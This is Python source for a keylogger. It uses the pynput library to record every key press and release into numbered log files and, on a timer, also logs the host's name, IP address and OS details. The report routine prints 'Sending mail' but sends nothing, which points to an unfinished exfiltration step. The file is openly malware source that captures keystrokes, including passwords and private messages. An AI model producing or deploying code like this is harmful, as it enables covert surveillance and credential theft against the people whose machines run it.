import logging
import socket
import platform
import os
import threading
from pynput import keyboard


class KeyLogger():
    def __init__(self, interval, stop) -> None:
        self.interval = interval
        self.stop = stop
        self.log_number = 0
        self.create_log_dir()

    def create_log_dir(self):
        if not os.path.exists("logs"):
            os.makedirs("logs")
    
    def config_logger(self):
        log = logging.getLogger()
        for handler in log.handlers:
            if isinstance(handler, logging.FileHandler):
                log.removeHandler(handler)
    
        file_handler = logging.FileHandler(f"logs/{self.log_number}.log", "a")
        formatter = logging.Formatter('%(asctime)s : %(message)s')
        file_handler.setFormatter(formatter)
        log.addHandler(file_handler)
        log.setLevel(logging.INFO)

    def format_key(self, key):
        try:
            formatted_key = key.char
        except:
            formatted_key = key
        finally:
            return formatted_key

    def on_press(self, key):
        logging.info(f"[PRESSED]: {self.format_key(key)}")
    
    def on_release(self, key):
        logging.info(f"[RELEASED]: {self.format_key(key)}")
        if key == keyboard.Key.esc and self.stop == True:
            return False
    
    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        logging.info("(SYSTEM INFORMATION)")
        logging.info(f"hostname: {hostname}")
        logging.info(f"ip: {ip}")
        logging.info(f"processor: {platform.processor()}")
        logging.info(f"system: {platform.system()}")
        logging.info(f"machine: {platform.machine()}")
        logging.info(f"release: {platform.release()}")
        logging.info(f"architecture: {platform.architecture()}\n")

    def report(self):
        print("Sending mail")
        self.log_number += 1
        self.config_logger()
        self.system_information()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(10, True)
    keylogger.run()
